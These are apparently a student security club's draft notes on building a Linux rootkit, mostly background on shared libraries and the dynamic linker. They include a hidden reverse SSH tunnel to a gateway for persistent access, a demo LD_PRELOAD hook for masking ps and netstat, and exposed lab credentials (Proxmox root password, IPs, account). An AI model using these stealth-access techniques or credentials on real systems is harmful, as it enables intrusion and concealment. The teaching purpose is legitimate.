# How to write a Linux rootkit

This post is based on a presentation I created for UMass Cybersecurity Club.

TODO: A rootkit is ...

## 1. Scenario

### 1.1 Lab Connection Info

> **Proxmox Connection Info:**
> `10.37.1.2:8006`
> `root`
> `detroitfinalbeenkeptopposite`
> VM Info:
>
> - Version: Ubuntu Server 24.04.3 LTS
> - Name: `asritha-rootkit-lab`
> - VM ID: 110
> - Node: `w1`
> - ISO file location: `/var/lib/vz/template/iso/ubuntu-24.04.3-live-server-amd64.iso` on `w1`
> - Hostname: `asritha`
> - Username: `asritha`
> - Password: `password`
> - SSH keys imported from Github
> - SSH Command: `ssh -i ~/.ssh/github asritha@10.37.1.134`

> **GCP Connection Info**:
> VM Info:
>
> - GCP account: `umassredblueteam@gmail.com`
> - GCP Project: `general`
> - Name: `rk`
> - External IP: `35.196.145.50`

### 1.2 Reverse SSH Shells Info

- Must generate a public/private SSH key pair on the pwned machine, register the pwned machine's public key as an authorized key:

On pwned machine:

- `ssh-keygen -t rsa`
- `cat ~/.ssh/id_rsa.pub`

On C2:

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCldGAsIsvBDNn0bf2z7Z+8gecjyeM/z0HpEkWLZQv+NOrOZQa6L2En0E1bgytRECWMSf912FwfosC4QGrbuNMn49DFLGEabBABzpbMPyibZkKTB4nqLcN3sFhyVVUzkrecQd8G+QlbdxsbvwbnIOkEKBQVDnxoM05N9Jj/vJi+BpxjjtJeE6n8ylkFUcr/R4yLG+mXNBkt7s8imb0nGQn3xWl/6D+WGSSs31U+wm6pd8tWWsMKIOmSOaUTzdsqxTCTKfk1VcTcx2mQhXYDrhoLkbnFQB8+QdIIIPRSApAtRaJiCmFOmhkJJCKuQzlA6YdtMIl7cOyO5P48CvAsQMTZjlYWGbPMx/s3wa/WRFSj+GvogSBCrNQiecNI4ihadCvunqiSbwrypeQL1XRYA8At6YbKCCZSIRvmx5iRzgX947sf/jLLIDQx4Wa/J1tAOamkYjJ1v+nS6MWspH5D4TAcCBTDEsH/psp5T3+GCI/bwiM53e4D5gbkXjr2BGWLYV8= asritha@asritha

- `vim ~/.ssh/authorized_keys`, pasted key
- `chmod 700 ~/.ssh`
- `chmod 600 ~/.ssh/authorized_keys`
- open port 7070

https://testsssh.free.beeceptor.com - to get the SSH key from the pwned server

- https://moreillon.medium.com/ssh-reverse-shells-5094d9be2094

C2 IP: `192.168.1.3`
Gateway Server IP: `192.168.1.4`
Server IP: `192.168.1.2`

- without server sitting behind firewall: `ssh 192.168.1.2` (from C2)
- reverse SSH shell using laptop as C2 (not sustainable):
  - 1. initiated from server: `ssh -R localhost:7070:localhost:22 192.168.1.3`:
    - `<host on destination>:<port on destination>:<host on origin>:<post on origin>`
    - `-R`: remote port forwarding; forward any traffic recieved on the C2 at `7070` to the server's SSH daemon (port 22)
      - `localhost:7070` means the tunnel binds to `localhost` on the C2 itself (so only processes on `192.168.1.3` itself can connect to port `7070` to reach port `20` on pwned-server.
  - 2. from C2: `ssh -p 7070 localhost`

- reverse SSH shell using GCP VM as gateway server:
  - 1. initiated from pwned-server:
       `nohup ssh -R 0.0.0.0:7070:localhost:22 umassredblueteam@192.168.1.4 > /dev/null 2>&1 &` TODO: figure out how nohup actually works + `/dev/null` - this command should make both output streams + error streams from the reverse shell disappear
       - apparently can also do this to "disown it" so it doesn't show up in the shell's job table `nohup <xxx> > /dev/null 2&1 & disown` TODO: idk what this means, do we want to do this?
    - `0.0.0.0:7070` means the tunnel binds to `0.0.0.0` on the C2 (all network interfaces), so any machine can reach `192.168.1.4` can connect and will be forwarded to pwned-server at port `22`

  - 2. edit gateway's SSH server `/etc/ssh/sshd_config` file
  - 3. from C2: ssh through gateway onto pwned-VM: `ssh -p 7070 192.168.1.4`

_To make connection restart itself upon failing_:

- append to `.bashrc`
- write a service file for SystemD, enable it for automtic start on boot (`/etc/systemd/system`) - look into later (TODO: finish from article)

### 1.3 The "noise"

**.bashrc**:

- `ps`
- network traffic

## 2. User Space Rootkits

### 2.1 Backdoored Commands

#### 2.1.1 Replacing system binaries?

##### 2.1.1.1 Attacking

A rootkit can be as simple as replacing binaries to mislead sysadmins.

Great targets are the **GNU Core Utilities** (or `coreutils`), as they come stock in most GNU/Linux distributions, so portability will be wide.

Broadly, the `coreutils` package covers three major areas:

- **File, shell, and basic utilities**:
  - `ls` (list directory contents)
  - `cp` (copy files)
  - `mv` (move or rename)
  - `rm` (remove)
  - `chmod` / `chown` (change file permissions and ownership)
  - `dd` (low-level data copy/convert)
  - `sum`: computes a checksum (weak and outdated, use `sha256sum`, `md5sum`, etc. instead)

- **Text processing tools**:
  - `sort` (sort lines)
  - `uniq` (suppress or report duplicates)
  - `cut` (extract fields)
  - `tr` (translate/delete characters)
  - `wc` (count words, lines, bytes)

- **Shell/system basics**:
  - `echo` (print arguments)
  - `true` / `false` (always succeed/fail)
  - `date` (system time)
  - `uname` (system info)
  - `who`, `id`, `groups` (user info)

##### 2.1.1.2 Defending

#### 2.1.2 `LD_PRELOAD`

- can misuse `LD_LIBRARY_PATH`
- can modify LD_PRELOAD? (env or actual file?)

##### 2.1.2.1 Prerequisites

- **library** in C: collection of precompiled code (functions, data, etc.) that can be reused in programs.
  - two types:
    - static library (`.a` or `.lib`): linked at compile time, becomes part of the executable
    - shared/dynamic library (`.so` on Linux, `.dll` on Windows): linked at runtime, loaded into memory when the program runs
  - ex.
    - `libc.so` (standard C library) or the glibc (GNU version of the standard C library)
    - `libcurl`: multiprotocol file transfer library
    - `libm.so` (math functions)
  - usage: `#include <math.h>` (header) + `-lm` (linker flag for `libm`)

- `libc` vs `glibc`:
  - `libc`: shorthand for C standard library implementation
    - every system that supports C needs to implement the standard library (ex. functions like `printf`, `malloc`, etc.)
    - is not a codebase, rather it is a _concept_ defined by the C standard
    - different OS/platforms can have different `libc` implementations
    - examples of `libc` implementations:
      - `glibc`: GNU C library, used on most Linux distros
      - `musl libc`: lightweight altenrative, common in Alpine linux
      - `BSD libc`: FreeBSD, OpenBSD, NetBSD
    - basically an abstract idea
    - when you link with `-lc`, linker finds your systems libc
  - `glibc`: GNU project implemention of libc; used default on GNU/Linux systems
    - distributed as `glibc` source code, builds into `libc.so` (shared library)

- GNU project:
  - had a C library (`glibc`), compiler (GCC), shells and core utilites (`bash`, `ls`, `cp`, `grep`, `awk`, etc.)
  - ppl call "GNU Linux" bc (Linux kernel + GNU userland (bash, coreutils, glibc, etc.))
- **module** in C: (no formal defininition, this is the definition in practice): refers to a .c file and its header (`.h`)

- dynamic/shared libraries:
  - types:
    - **dynamically linked libraries**:
      - the normal shared libraries (`.so` on Linux)
      - _linking happens at program startup_
      - executable is built with references to symbols in a shared library (via the ELF dynamic linker e.g. `ld-linux.so` on Linux)
      - when you run the program:
        - 1. dynamic loader maps require `.so` files into memory
        - 2. symbol addresses (ex. `prinf`) are resolved
        - 3. program runs normally
      - you don't need to run special code beyond linking with `-l<libname>`
      - TODO: make own library, then link in all 3 ways to understand
      - ex.

        ```C
        #include <stdio.h>

        int main() {
            printf("Hello\n");
            return 0;
        }
        ```

        - `gcc main.c`: by default links dynamically to `libc.so` (`printf` lives in `libc.so`)
        - `ldd prog`: shows `libc.so` and other shared libraries

    - **dynamically loaded libraries**:
      - also shared libraries but loaded **manually by code in runtime**
      - you must decide _when_ + _if_ to run them -> is not automatic at program startup
      - can do so with functions like `dlopen()`, `dlsym()`, `dlcloe()` on Linux (`<dlfcn.h>`)
      - useful for: optional plugins, don't want a hard dependency, want to choose multiple libraries at runtime
      - ex. TODO: come back and understand this example

        ```C
        #include <stdio.h>
        #include <dlfcn.h>

        int main() {
            void *handle;
            void (*hello)();

            handle = dlopen("./libplugin.so", RTLD_LAZY);
            if (!handle) {
                fprintf(stderr, "%s\n", dlerror());
                return 1;
            }

            hello = dlsym(handle, "hello");
            hello();

            dlclose(handle);
            return 0;
        }
        ```

        ```C
        // libplugin.so
        #include <stdio.h>
        void hello() {
            printf("Hello from plugin!\n");
        }
        ```

        - to compile (TODO: understand these)
          ```bash
          gcc -fPIC -shared -o libplugin.so plugin.c
          gcc main.c -ldl -o prog
          ```
        - to run: `./prog`

- naming conventions of shared libraries:
  - named two ways:
    - 1. library name (or _soname_)
    - 2. filename (absolute path to file which stores library code)
  - ex. `libc`:
    - `libc.so.6`: soname
    - `/lib64/libc.so.6`: filename
  - soname is actually a symbolic link to filename

- dynamic linker/loader:
  - when you run a dynamically linked program on Linux:
  - 1. Kernel loads programs ELF file (Executable and Linkable format)
    - ELF header will specify which libraries the program depends on + specifies which program should resolve them (the interpreter (dynamic linker))
  - 2. dynamic linker (`ld-linux.so`) is invoked automatically
    - path is usually `lib64/ld-linux-x86-64.so.2` (on 64 bit systems)
    - program is a tiny loader that should:
      - a) find shared libraries (ex. `libc.so.6`, `libm.so.6`)
      - b) map them into memory
      - c) resolve symbol addresses (`printf`, `malloc`, etc.)
      - d) reallocate code so function calls point to the right place
  - 3. program can now call `printf`, `malloc`, etc. bc they have been hooked into memory

- naming:
  - `ld.so` (or `ld-linux.so`) = the dynamic linker/loader binary.
  - The `.x` at the end is the version (e.g. `ld-linux-x86-64.so.2` for glibc 2.x on 64-bit x86).
  - Different CPU architectures have different loaders:
    - x86-64 → `/lib64/ld-linux-x86-64.so.2`

- search process for shared libraries:
  - When `ld-linux.so` needs to find a `.so` file, it searches in the following order:
    - 1. `DT_RPATH` in ELF binary (deprecated)
    - 2. `LD_LIBRARY_PATH` (environment variable)
    - 3. `DT_RUNPATH` in ELF binary
    - 4. defualt system directories: `/lib`, `/usr/lib`, `/lib64`, etc.
    - you can also include order with:
      - `ldconfig` and `/etc/ld.so.conf` (system library cache)
      - `LD_PRELOAD` (force a library to be loaded first)

- example:

  ```C
  #include <stdio.h>
  int main() {
      printf("hi\n");
      return 0;
  }
  ```

  - compile: `gcc hello.c -o hello`
  - check dependencies: `ldd hello`
    sample output:

  ```bash
      linux-vdso.so.1 (0x00007ffdf6ffd000)
      libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f6a92d00000)
      /lib64/ld-linux-x86-64.so.2 (0x00007f6a92f00000)
  ```

  - `libc.so.6`: provides `printf`
  - `/lib64/ld-linux-x86-64.so.2`: is the interpreter (dynamic loader)
  - so when kernel runs `./hello` it actually does `/lib64/ld-linux-x86-64.so.2 ./hello`

- in this context, "interpreter" refers to program that interpretes dynamic linking information
  - kernel sees the `PT_INTERP` header in the ELF binary (which should point to a file path) and says "don't run this binary directly, first run the other program (the interpreter) and give it the binary as input"
    - "interpreter" = dynamic linker/loader(`ld-linux.so`)

- summary:
  - compiler (`gcc`): records needed libraries into ELF
  - kernel: loads ELF, hands off to dynamic linker
  - dynamic linker (`ld-linux.so`): finds `.so` files, maps them, resovles symbols
  - program then runs with libraries ready

##### 2.1.2.2 Attacking

**Notes from "Current State of Linux Rookits" video**

- shared library objects?
- A lot of Linux binaries are dynamically linked
  - view which ones are dynamically linked (`ldd /bin/ls`)
  - precedence within the libraries the binary uses
    - ones listed at top of ldd command are loaded first
  - dynamic library symbols are "weak" -> can be overwritten by priously linked symbols
  - in libc, all system calls are wrapped in a function
  - `ld.so.preload` (in `/etc/` directory): any shared libraries referenced in this file will be linked to all binaries in system that use dynamic linking (BEFORE using any of their own library dependencies) -> you can load your own versions of common syscall functions

```C
// demo hook.so
int puts(const char *message) {
    int (*new_puts)(const char *message);
    int result;
    new_puts = dlsym(RTLD_NEXT, "puts");
    if(strcmp(message, "hello world") == 0) {
        result = new_puts("function hooked!");
    }
    else {
        result = new_puts(message); // idk if this line is correct
    }
    return result;
}
```

- so run syscall tracer on any binary we want to hook with LD_preload, then replace those shared objects with our own hooks?
- what does `ps` + `netstat` actually do (open `/proc`, `/proc/net` directories respectively, then iterate through those files/folders, then output format nicely?)
  - create hooked versions of the syscalls

##### 2.1.2.3 Defending

**Notes from "Current State of Linux Rookits" video**

- linux system almost entirely dynamically linked, but there will still be some statically linked programs
- so could statically compile binaries (ex. use `busybox` static binaries) - `busybox ls -la` (TODO: look into this)

- from Om: sign everything yourself and then enroll key into UEFI if it doesnt support secure boot (like Arch) -> learn more about this stuff im confuzzled

---

# TODO:

### 1.1 A noisy keylogger

- get from the yt video + then add reach out to netcat server via json
- 3 noise avenues we want to hide: `ls`, `ps`, and network traffic; there are prolly other noise avenues (figure these out to list examples), but let's focus on these three

### 1.2 Simulated crypto miner that doesnt actually mine a coin but creates the same CPU spikes as a bitcoin miner would, netcat server

- ask chat
- the additional stuff to hide would be the cpu spike
